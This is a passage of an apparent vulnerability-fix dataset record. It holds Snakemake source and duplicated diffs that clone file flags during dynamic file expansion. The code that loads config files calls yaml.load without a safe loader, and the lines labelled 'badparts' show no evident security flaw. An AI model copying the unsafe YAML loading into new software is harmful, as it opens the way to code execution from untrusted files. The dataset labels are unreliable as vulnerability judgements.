!= \".\":\n                f = os.path.join(dirpath, f)\n            match = re.match(pattern, f)\n            if match:\n                for name, value in match.groupdict().items():\n                    getattr(wildcards, name).append(value)\n    return wildcards\n\n\n# TODO rewrite Namedlist!\nclass Namedlist(list):\n    \"\"\"\n    A list that additionally provides functions to name items. Further,\n    it is hashable, however the hash does not consider the item names.\n    \"\"\"\n\n    def __init__(self, toclone=None, fromdict=None, plainstr=False):\n        \"\"\"\n        Create the object.\n\n        Arguments\n        toclone  -- another Namedlist that shall be cloned\n        fromdict -- a dict that shall be converted to a\n            Namedlist (keys become names)\n        \"\"\"\n        list.__init__(self)\n        self._names = dict()\n\n        if toclone:\n            self.extend(map(str, toclone) if plainstr else toclone)\n            if isinstance(toclone, Namedlist):\n                self.take_names(toclone.get_names())\n        if fromdict:\n            for key, item in fromdict.items():\n                self.append(item)\n                self.add_name(key)\n\n    def add_name(self, name):\n        \"\"\"\n        Add a name to the last item.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        self.set_name(name, len(self) - 1)\n\n    def set_name(self, name, index, end=None):\n        \"\"\"\n        Set the name of an item.\n\n        Arguments\n        name  -- a name\n        index -- the item index\n        \"\"\"\n        self._names[name] = (index, end)\n        if end is None:\n            setattr(self, name, self[index])\n        else:\n            setattr(self, name, Namedlist(toclone=self[index:end]))\n\n    def get_names(self):\n        \"\"\"\n        Get the defined names as (name, index) pairs.\n        \"\"\"\n        for name, index in self._names.items():\n            yield name, index\n\n    def take_names(self, names):\n        \"\"\"\n        Take over the given names.\n\n        Arguments\n        names -- the given names as (name, index) pairs\n        \"\"\"\n        for name, (i, j) in names:\n            self.set_name(name, i, end=j)\n\n    def items(self):\n        for name in self._names:\n            yield name, getattr(self, name)\n\n    def allitems(self):\n        next = 0\n        for name, index in sorted(self._names.items(),\n                                  key=lambda item: item[1][0]):\n            start, end = index\n            if end is None:\n                end = start + 1\n            if start > next:\n                for item in self[next:start]:\n                    yield None, item\n            yield name, getattr(self, name)\n            next = end\n        for item in self[next:]:\n            yield None, item\n\n    def insert_items(self, index, items):\n        self[index:index + 1] = items\n        add = len(items) - 1\n        for name, (i, j) in self._names.items():\n            if i > index:\n                self._names[name] = (i + add, j + add)\n            elif i == index:\n                self.set_name(name, i, end=i + len(items))\n\n    def keys(self):\n        return self._names\n\n    def plainstrings(self):\n        return self.__class__.__call__(toclone=self, plainstr=True)\n\n    def __getitem__(self, key):\n        try:\n            return super().__getitem__(key)\n        except TypeError:\n            pass\n        return getattr(self, key)\n\n    def __hash__(self):\n        return hash(tuple(self))\n\n    def __str__(self):\n        return \" \".join(map(str, self))\n\n\nclass InputFiles(Namedlist):\n    pass\n\n\nclass OutputFiles(Namedlist):\n    pass\n\n\nclass Wildcards(Namedlist):\n    pass\n\n\nclass Params(Namedlist):\n    pass\n\n\nclass Resources(Namedlist):\n    pass\n\n\nclass Log(Namedlist):\n    pass\n\n\ndef _load_configfile(configpath):\n    \"Tries to load a configfile first as JSON, then as YAML, into a dict.\"\n    try:\n        with open(configpath) as f:\n            try:\n                return json.load(f)\n            except ValueError:\n                f.seek(0)  # try again\n            try:\n                import yaml\n            except ImportError:\n                raise WorkflowError(\"Config file is not valid JSON and PyYAML \"\n                                    \"has not been installed. Please install \"\n                                    \"PyYAML to use YAML config files.\")\n            try:\n                return yaml.load(f)\n            except yaml.YAMLError:\n                raise WorkflowError(\"Config file is not valid JSON or YAML.\")\n    except FileNotFoundError:\n        raise WorkflowError(\"Config file {} not found.\".format(configpath))\n\n\ndef load_configfile(configpath):\n    \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\"\n    config = _load_configfile(configpath)\n    if not isinstance(config, dict):\n        raise WorkflowError(\"Config file must be given as JSON or YAML \"\n                            \"with keys at top level.\")\n    return config\n\n##### Wildcard pumping detection #####\n\n\nclass PeriodicityDetector:\n    def __init__(self, min_repeat=50, max_repeat=100):\n        \"\"\"\n        Args:\n            max_len (int): The maximum length of the periodic substring.\n        \"\"\"\n        self.regex = re.compile(\n            \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format(\n                min_repeat=min_repeat - 1,\n                max_repeat=max_repeat - 1))\n\n    def is_periodic(self, value):\n        \"\"\"Returns the periodic substring or None if not periodic.\"\"\"\n        m = self.regex.search(value)  # search for a periodic suffix.\n        if m is not None:\n            return m.group(\"value\")\n"},"\/snakemake\/jobs.py":{"changes":[{"diff":"\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n","add":1,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile"],"goodparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard"]},{"diff":"\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n","add":34,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["                    yield IOFile(f, self.rule)"],"goodparts":["                    fileToYield = IOFile(f, self.rule)","                    fileToYield.clone_flags(f_)","                    yield fileToYield","            else:","                yield f","    @property","    def expanded_input(self):","        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"","        for f, f_ in zip(self.input, self.rule.input):","            if not type(f_).__name__ == \"function\":","                if type(f_.file).__name__ not in [\"str\", \"function\"]:","                    if contains_wildcard(f_):","                        expansion = self.expand_dynamic(","                            f_,","                            restriction=self.wildcards,","                            omit_value=_IOFile.dynamic_fill)","                        if not expansion:","                            yield f_","                        for f, _ in expansion:","                            fileToYield = IOFile(f, self.rule)","                            fileToYield.clone_flags(f_)","                            yield fileToYield","                    else:","                        yield f","                else:","                    yield f"]},{"diff":"\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n","add":1,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile"],"goodparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard"]},{"diff":"\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n","add":34,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["                    yield IOFile(f, self.rule)"],"goodparts":["                    fileToYield = IOFile(f, self.rule)","                    fileToYield.clone_flags(f_)","                    yield fileToYield","            else:","                yield f","    @property","    def expanded_input(self):","        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"","        for f, f_ in zip(self.input, self.rule.input):","            if not type(f_).__name__ == \"function\":","                if type(f_.file).__name__ not in [\"str\", \"function\"]:","                    if contains_wildcard(f_):","                        expansion = self.expand_dynamic(","                            f_,","                            restriction=self.wildcards,","                            omit_value=_IOFile.dynamic_fill)","                        if not expansion:","                            yield f_","                        for f, _ in expansion:","                            fileToYield = IOFile(f, self.rule)","                            fileToYield.clone_flags(f_)","                            yield fileToYield","                    else:","                        yield f","                else:","                    yield f"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import sys import base64 import json from collections import defaultdict from itertools import chain from functools import partial from operator import attrgetter from snakemake.io import IOFile, Wildcards, Resources, _IOFile from snakemake.utils import format, listfiles from snakemake.exceptions import RuleException, ProtectedOutputException from snakemake.exceptions import UnexpectedOutputException from snakemake.logging import logger def jobfiles(jobs, type): return chain(*map(attrgetter(type), jobs)) class Job: HIGHEST_PRIORITY=sys.maxsize def __init__(self, rule, dag, targetfile=None, format_wildcards=None): self.rule=rule self.dag=dag self.targetfile=targetfile self.wildcards_dict=self.rule.get_wildcards(targetfile) self.wildcards=Wildcards(fromdict=self.wildcards_dict) self._format_wildcards=(self.wildcards if format_wildcards is None else Wildcards(fromdict=format_wildcards)) (self.input, self.output, self.params, self.log, self.benchmark, self.ruleio, self.dependencies)=rule.expand_wildcards(self.wildcards_dict) self.resources_dict={ name: min(self.rule.workflow.global_resources.get(name, res), res) for name, res in rule.resources.items() } self.threads=self.resources_dict[\"_cores\"] self.resources=Resources(fromdict=self.resources_dict) self._inputsize=None self.dynamic_output, self.dynamic_input=set(), set() self.temp_output, self.protected_output=set(), set() self.touch_output=set() self.subworkflow_input=dict() for f in self.output: f_=self.ruleio[f] if f_ in self.rule.dynamic_output: self.dynamic_output.add(f) if f_ in self.rule.temp_output: self.temp_output.add(f) if f_ in self.rule.protected_output: self.protected_output.add(f) if f_ in self.rule.touch_output: self.touch_output.add(f) for f in self.input: f_=self.ruleio[f] if f_ in self.rule.dynamic_input: self.dynamic_input.add(f) if f_ in self.rule.subworkflow_input: self.subworkflow_input[f]=self.rule.subworkflow_input[f_] self._hash=self.rule.__hash__() if True or not self.dynamic_output: for o in self.output: self._hash ^=o.__hash__() @property def priority(self): return self.dag.priority(self) @property def b64id(self): return base64.b64encode((self.rule.name +\"\".join(self.output) ).encode(\"utf-8\")).decode(\"utf-8\") @property def inputsize(self): \"\"\" Return the size of the input files. Input files need to be present. \"\"\" if self._inputsize is None: self._inputsize=sum(f.size for f in self.input) return self._inputsize @property def message(self): \"\"\" Return the message for this job. \"\"\" try: return(self.format_wildcards(self.rule.message) if self.rule.message else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable in message \" \"of shell command:{}\".format(str(ex)), rule=self.rule) @property def shellcmd(self): \"\"\" Return the shell command. \"\"\" try: return(self.format_wildcards(self.rule.shellcmd) if self.rule.shellcmd else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable when printing \" \"shell command:{}\".format(str(ex)), rule=self.rule) @property def expanded_output(self): \"\"\" Iterate over output files while dynamic output is expanded. \"\"\" for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: expansion=self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill) if not expansion: yield f_ for f, _ in expansion: yield IOFile(f, self.rule) else: yield f @property def dynamic_wildcards(self): \"\"\" Return all wildcard values determined from dynamic output. \"\"\" combinations=set() for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: for f, w in self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): combinations.add(tuple(w.items())) wildcards=defaultdict(list) for combination in combinations: for name, value in combination: wildcards[name].append(value) return wildcards @property def missing_input(self): \"\"\" Return missing input files. \"\"\" return set(f for f in self.input if not f.exists and not f in self.subworkflow_input) @property def output_mintime(self): \"\"\" Return oldest output file. \"\"\" existing=[f.mtime for f in self.expanded_output if f.exists] if self.benchmark and self.benchmark.exists: existing.append(self.benchmark.mtime) if existing: return min(existing) return None @property def input_maxtime(self): \"\"\" Return newest input file. \"\"\" existing=[f.mtime for f in self.input if f.exists] if existing: return max(existing) return None def missing_output(self, requested=None): \"\"\" Return missing output files. \"\"\" files=set() if self.benchmark and(requested is None or self.benchmark in requested): if not self.benchmark.exists: files.add(self.benchmark) for f, f_ in zip(self.output, self.rule.output): if requested is None or f in requested: if f in self.dynamic_output: if not self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): files.add(\"{}(dynamic)\".format(f_)) elif not f.exists: files.add(f) return files @property def existing_output(self): return filter(lambda f: f.exists, self.expanded_output) def check_protected_output(self): protected=list(filter(lambda f: f.protected, self.expanded_output)) if protected: raise ProtectedOutputException(self.rule, protected) def prepare(self): \"\"\" Prepare execution of job. This includes creation of directories and deletion of previously created dynamic files. \"\"\" self.check_protected_output() unexpected_output=self.dag.reason(self).missing_output.intersection( self.existing_output) if unexpected_output: logger.warning( \"Warning: the following output files of rule{} were not \" \"present when the DAG was created:\\n{}\".format( self.rule, unexpected_output)) if self.dynamic_output: for f, _ in chain(*map(partial(self.expand_dynamic, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill), self.rule.dynamic_output)): os.remove(f) for f, f_ in zip(self.output, self.rule.output): f.prepare() for f in self.log: f.prepare() if self.benchmark: self.benchmark.prepare() def cleanup(self): \"\"\" Cleanup output files. \"\"\" to_remove=[f for f in self.expanded_output if f.exists] if to_remove: logger.info(\"Removing output files of failed job{}\" \" since they might be corrupted:\\n{}\".format( self, \", \".join(to_remove))) for f in to_remove: f.remove() def format_wildcards(self, string, **variables): \"\"\" Format a string with variables from the job. \"\"\" _variables=dict() _variables.update(self.rule.workflow.globals) _variables.update(dict(input=self.input, output=self.output, params=self.params, wildcards=self._format_wildcards, threads=self.threads, resources=self.resources, log=self.log, version=self.rule.version, rule=self.rule.name,)) _variables.update(variables) try: return format(string, **_variables) except NameError as ex: raise RuleException(\"NameError: \" +str(ex), rule=self.rule) except IndexError as ex: raise RuleException(\"IndexError: \" +str(ex), rule=self.rule) def properties(self, omit_resources=\"_cores _nodes\".split()): resources={ name: res for name, res in self.resources.items() if name not in omit_resources } params={name: value for name, value in self.params.items()} properties={ \"rule\": self.rule.name, \"local\": self.dag.workflow.is_local(self.rule), \"input\": self.input, \"output\": self.output, \"params\": params, \"threads\": self.threads, \"resources\": resources } return properties def json(self): return json.dumps(self.properties()) def __repr__(self): return self.rule.name def __eq__(self, other): if other is None: return False return self.rule==other.rule and( self.dynamic_output or self.wildcards_dict==other.wildcards_dict) def __lt__(self, other): return self.rule.__lt__(other.rule) def __gt__(self, other): return self.rule.__gt__(other.rule) def __hash__(self): return self._hash @staticmethod def expand_dynamic(pattern, restriction=None, omit_value=None): \"\"\" Expand dynamic files. \"\"\" return list(listfiles(pattern, restriction=restriction, omit_value=omit_value)) class Reason: def __init__(self): self.updated_input=set() self.updated_input_run=set() self.missing_output=set() self.incomplete_output=set() self.forced=False self.noio=False self.nooutput=False self.derived=True def __str__(self): s=list() if self.forced: s.append(\"Forced execution\") else: if self.noio: s.append(\"Rules with neither input nor \" \"output files are always executed.\") elif self.nooutput: s.append(\"Rules with a run or shell declaration but no output \" \"are always executed.\") else: if self.missing_output: s.append(\"Missing output files:{}\".format( \", \".join(self.missing_output))) if self.incomplete_output: s.append(\"Incomplete output files:{}\".format( \", \".join(self.incomplete_output))) updated_input=self.updated_input -self.updated_input_run if updated_input: s.append(\"Updated input files:{}\".format( \", \".join(updated_input))) if self.updated_input_run: s.append(\"Input files updated by another job:{}\".format( \", \".join(self.updated_input_run))) s=\"; \".join(s) return s def __bool__(self): return bool(self.updated_input or self.missing_output or self.forced or self.updated_input_run or self.noio or self.nooutput) ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport sys\nimport base64\nimport json\n\nfrom collections import defaultdict\nfrom itertools import chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.io import IOFile, Wildcards, Resources, _IOFile\nfrom snakemake.utils import format, listfiles\nfrom snakemake.exceptions import RuleException, ProtectedOutputException\nfrom snakemake.exceptions import UnexpectedOutputException\nfrom snakemake.logging import logger\n\n\ndef jobfiles(jobs, type):\n    return chain(*map(attrgetter(type), jobs))\n\n\nclass Job:\n    HIGHEST_PRIORITY = sys.maxsize\n\n    def __init__(self, rule, dag, targetfile=None, format_wildcards=None):\n        self.rule = rule\n        self.dag = dag\n        self.targetfile = targetfile\n\n        self.wildcards_dict = self.rule.get_wildcards(targetfile)\n        self.wildcards = Wildcards(fromdict=self.wildcards_dict)\n        self._format_wildcards = (self.wildcards if format_wildcards is None\n                                  else Wildcards(fromdict=format_wildcards))\n\n        (self.input, self.output, self.params, self.log, self.benchmark,\n         self.ruleio,\n         self.dependencies) = rule.expand_wildcards(self.wildcards_dict)\n\n        self.resources_dict = {\n            name: min(self.rule.workflow.global_resources.get(name, res), res)\n            for name, res in rule.resources.items()\n        }\n        self.threads = self.resources_dict[\"_cores\"]\n        self.resources = Resources(fromdict=self.resources_dict)\n        self._inputsize = None\n\n        self.dynamic_output, self.dynamic_input = set(), set()\n        self.temp_output, self.protected_output = set(), set()\n        self.touch_output = set()\n        self.subworkflow_input = dict()\n        for f in self.output:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_output:\n                self.dynamic_output.add(f)\n            if f_ in self.rule.temp_output:\n                self.temp_output.add(f)\n            if f_ in self.rule.protected_output:\n                self.protected_output.add(f)\n            if f_ in self.rule.touch_output:\n                self.touch_output.add(f)\n        for f in self.input:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_input:\n                self.dynamic_input.add(f)\n            if f_ in self.rule.subworkflow_input:\n                self.subworkflow_input[f] = self.rule.subworkflow_input[f_]\n        self._hash = self.rule.__hash__()\n        if True or not self.dynamic_output:\n            for o in self.output:\n                self._hash ^= o.__hash__()\n\n    @property\n    def priority(self):\n        return self.dag.priority(self)\n\n    @property\n    def b64id(self):\n        return base64.b64encode((self.rule.name + \"\".join(self.output)\n                                 ).encode(\"utf-8\")).decode(\"utf-8\")\n\n    @property\n    def inputsize(self):\n        \"\"\"\n        Return the size of the input files.\n        Input files need to be present.\n        \"\"\"\n        if self._inputsize is None:\n            self._inputsize = sum(f.size for f in self.input)\n        return self._inputsize\n\n    @property\n    def message(self):\n        \"\"\" Return the message for this job. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.message) if\n                    self.rule.message else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable in message \"\n                                \"of shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def shellcmd(self):\n        \"\"\" Return the shell command. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.shellcmd) if\n                    self.rule.shellcmd else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable when printing \"\n                                \"shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def expanded_output(self):\n        \"\"\" Iterate over output files while dynamic output is expanded. \"\"\"\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                expansion = self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill)\n                if not expansion:\n                    yield f_\n                for f, _ in expansion:\n                    yield IOFile(f, self.rule)\n            else:\n                yield f\n\n    @property\n    def dynamic_wildcards(self):\n        \"\"\" Return all wildcard values determined from dynamic output. \"\"\"\n        combinations = set()\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                for f, w in self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill):\n                    combinations.add(tuple(w.items()))\n        wildcards = defaultdict(list)\n        for combination in combinations:\n            for name, value in combination:\n                wildcards[name].append(value)\n        return wildcards\n\n    @property\n    def missing_input(self):\n        \"\"\" Return missing input files. \"\"\"\n        # omit file if it comes from a subworkflow\n        return set(f for f in self.input\n                   if not f.exists and not f in self.subworkflow_input)\n\n    @property\n    def output_mintime(self):\n        \"\"\" Return oldest output file. \"\"\"\n        existing = [f.mtime for f in self.expanded_output if f.exists]\n        if self.benchmark and self.benchmark.exists:\n            existing.append(self.benchmark.mtime)\n        if existing:\n            return min(existing)\n        return None\n\n    @property\n    def input_maxtime(self):\n        \"\"\" Return newest input file. \"\"\"\n        existing = [f.mtime for f in self.input if f.exists]\n        if existing:\n            return max(existing)\n        return None\n\n    def missing_output(self, requested=None):\n        \"\"\" Return missing output files. \"\"\"\n        files = set()\n        if self.benchmark and (requested is None or\n                               self.benchmark in requested):\n            if not self.benchmark.exists:\n                files.add(self.benchmark)\n\n        for f, f_ in zip(self.output, self.rule.output):\n            if requested is None or f in requested:\n                if f in self.dynamic_output:\n                    if not self.expand_dynamic(\n                        f_,\n                        restriction=self.wildcards,\n                        omit_value=_IOFile.dynamic_fill):\n                        files.add(\"{} (dynamic)\".format(f_))\n                elif not f.exists:\n                    files.add(f)\n        return files\n\n    @property\n    def existing_output(self):\n        return filter(lambda f: f.exists, self.expanded_output)\n\n    def check_protected_output(self):\n        protected = list(filter(lambda f: f.protected, self.expanded_output))\n        if protected:\n            raise ProtectedOutputException(self.rule, protected)\n\n    def prepare(self):\n        \"\"\"\n        Prepare execution of job.\n        This includes creation of directories and deletion of previously\n        created dynamic files.\n        \"\"\"\n\n        self.check_protected_output()\n\n        unexpected_output = self.dag.reason(self).missing_output.intersection(\n            self.existing_output)\n        if unexpected_output:\n            logger.warning(\n                \"Warning: the following output files of rule {} were not \"\n                \"present when the DAG was created:\\n{}\".format(\n                    self.rule, unexpected_output))\n\n        if self.dynamic_output:\n            for f, _ in chain(*map(partial(self.expand_dynamic,\n                                           restriction=self.wildcards,\n                                           omit_value=_IOFile.dynamic_fill),\n                                   self.rule.dynamic_output)):\n                os.remove(f)\n        for f, f_ in zip(self.output, self.rule.output):\n            f.prepare()\n        for f in self.log:\n            f.prepare()\n        if self.benchmark:\n            self.benchmark.prepare()\n\n    def cleanup(self):\n        \"\"\" Cleanup output files. \"\"\"\n        to_remove = [f for f in self.expanded_output if f.exists]\n        if to_remove:\n            logger.info(\"Removing output files of failed job {}\"\n                        \" since they might be corrupted:\\n{}\".format(\n                            self, \", \".join(to_remove)))\n            for f in to_remove:\n                f.remove()\n\n    def format_wildcards(self, string, **variables):\n        \"\"\" Format a string with variables from the job. \"\"\"\n        _variables = dict()\n        _variables.update(self.rule.workflow.globals)\n        _variables.update(dict(input=self.input,\n                               output=self.output,\n                               params=self.params,\n                               wildcards=self._format_wildcards,\n                               threads=self.threads,\n                               resources=self.resources,\n                               log=self.log,\n                               version=self.rule.version,\n                               rule=self.rule.name, ))\n        _variables.update(variables)\n        try:\n            return format(string, **_variables)\n        except NameError as ex:\n            raise RuleException(\"NameError: \" + str(ex), rule=self.rule)\n        except IndexError as ex:\n            raise RuleException(\"IndexError: \" + str(ex), rule=self.rule)\n\n    def properties(self, omit_resources=\"_cores _nodes\".split()):\n        resources = {\n            name: res\n            for name, res in self.resources.items()\n            if name not in omit_resources\n        }\n        params = {name: value for name, value in self.params.items()}\n        properties = {\n            \"rule\": self.rule.name,\n            \"local\": self.dag.workflow.is_local(self.rule),\n            \"input\": self.input,\n            \"output\": self.output,\n            \"params\": params,\n            \"threads\": self.threads,\n            \"resources\": resources\n        }\n        return properties\n\n    def json(self):\n        return json.dumps(self.properties())\n\n    def __repr__(self):\n        return self.rule.name\n\n    def __eq__(self, other):\n        if other is None:\n            return False\n        return self.rule == other.rule and (\n            self.dynamic_output or self.wildcards_dict == other.wildcards_dict)\n\n    def __lt__(self, other):\n        return self.rule.__lt__(other.rule)\n\n    def __gt__(self, other):\n        return self.rule.__gt__(other.rule)\n\n    def __hash__(self):\n        return self._hash\n\n    @staticmethod\n    def expand_dynamic(pattern, restriction=None, omit_value=None):\n        \"\"\" Expand dynamic files. \"\"\"\n        return list(listfiles(pattern,\n                              restriction=restriction,\n                              omit_value=omit_value))\n\n\nclass Reason:\n    def __init__(self):\n        self.updated_input = set()\n        self.updated_input_run = set()\n        self.missing_output = set()\n        self.incomplete_output = set()\n        self.forced = False\n        self.noio = False\n        self.nooutput = False\n        self.derived = True\n\n    def __str__(self):\n        s = list()\n        if self.forced:\n            s.append(\"Forced execution\")\n        else:\n            if self.noio:\n                s.append(\"Rules with neither input nor \"\n                         \"output files are always executed.\")\n            elif self.nooutput:\n                s.append(\"Rules with a run or shell declaration but no output \"\n                         \"are always executed.\")\n            else:\n                if self.missing_output:\n                    s.append(\"Missing output files: {}\".format(\n                        \", \".join(self.missing_output)))\n                if self.incomplete_output:\n                    s.append(\"Incomplete output files: {}\".format(\n                        \", \".join(self.incomplete_output)))\n                updated_input = self.updated_input - self.updated_input_run\n                if updated_input:\n                    s.append(\"Updated input files: {}\".format(\n                        \", \".join(updated_input)))\n                if self.updated_input_run:\n                    s.append(\"Input files updated by another job: {}\".format(\n                        \", \".join(self.updated_input_run)))\n        s = \"; \".join(s)\n        return s\n\n    def __bool__(self):\n        return bool(self.updated_input or self.missing_output or self.forced or\n                    self.updated_input_run or self.noio or self.nooutput)\n"},"\/snakemake\/remote_providers\/__init__.py":{"changes":[{"diff":"-0,","add":0,"remove":0,"filename":"\/snakemake\/remote_providers\/__init__.py","badparts":["0,"],"goodparts":[]},{"diff":"-0,","add":0,"remove":0,"filename":"\/snakemake\/remote_providers\/__init__.py","badparts":["0,"],"goodparts":[]}]},"\/snakemake\/rules.py":{"changes":[{"diff":"\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     re","add":6,"remove":1,"filename":"\/snakemake\/rules.py","badparts":["                        expansion[i].append(IOFile(e, rule=branch))"],"goodparts":["                        ioFile = IOFile(e, rule=branch)","                        ioFile.clone_flags(f)","                        expansion[i].append(ioFile)"]},{"diff":"\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     re","add":6,"remove":1,"filename":"\/snakemake\/rules.py","badparts":["                        expansion[i].append(IOFile(e, rule=branch))"],"goodparts":["                        ioFile = IOFile(e, rule=branch)","                        ioFile.clone_flags(f)","                        expansion[i].append(ioFile)"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import sys import inspect import sre_constants from collections import defaultdict from snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist from snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log from snakemake.io import apply_wildcards, is_flagged, not_iterable from snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException class Rule: def __init__(self, *args, lineno=None, snakefile=None): \"\"\" Create a rule Arguments name --the name of the rule \"\"\" if len(args)==2: name, workflow=args self.name=name self.workflow=workflow self.docstring=None self.message=None self._input=InputFiles() self._output=OutputFiles() self._params=Params() self.dependencies=dict() self.dynamic_output=set() self.dynamic_input=set() self.temp_output=set() self.protected_output=set() self.touch_output=set() self.subworkflow_input=dict() self.resources=dict(_cores=1, _nodes=1) self.priority=0 self.version=None self._log=Log() self._benchmark=None self.wildcard_names=set() self.lineno=lineno self.snakefile=snakefile self.run_func=None self.shellcmd=None self.norun=False elif len(args)==1: other=args[0] self.name=other.name self.workflow=other.workflow self.docstring=other.docstring self.message=other.message self._input=InputFiles(other._input) self._output=OutputFiles(other._output) self._params=Params(other._params) self.dependencies=dict(other.dependencies) self.dynamic_output=set(other.dynamic_output) self.dynamic_input=set(other.dynamic_input) self.temp_output=set(other.temp_output) self.protected_output=set(other.protected_output) self.touch_output=set(other.touch_output) self.subworkflow_input=dict(other.subworkflow_input) self.resources=other.resources self.priority=other.priority self.version=other.version self._log=other._log self._benchmark=other._benchmark self.wildcard_names=set(other.wildcard_names) self.lineno=other.lineno self.snakefile=other.snakefile self.run_func=other.run_func self.shellcmd=other.shellcmd 